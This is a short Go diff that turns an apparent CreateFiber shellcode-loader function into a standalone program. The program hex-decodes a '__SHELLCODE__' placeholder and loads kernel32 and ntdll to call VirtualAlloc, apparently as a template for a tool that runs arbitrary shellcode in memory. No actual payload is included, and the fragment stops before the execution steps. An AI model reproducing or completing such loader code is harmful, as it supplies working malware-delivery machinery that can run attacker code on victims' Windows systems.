@@ -1,4 +1,4 @@
-package CreateFiber
+package main
 
 import (
 	"encoding/hex"
@@ -14,8 +14,8 @@ const (
 	PageReadwrite   = 0x04
 )
 
-func Createfiber(code string) {
-	shellcode, _ := hex.DecodeString(code)
+func main() {
+	shellcode, _ := hex.DecodeString("__SHELLCODE__")
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
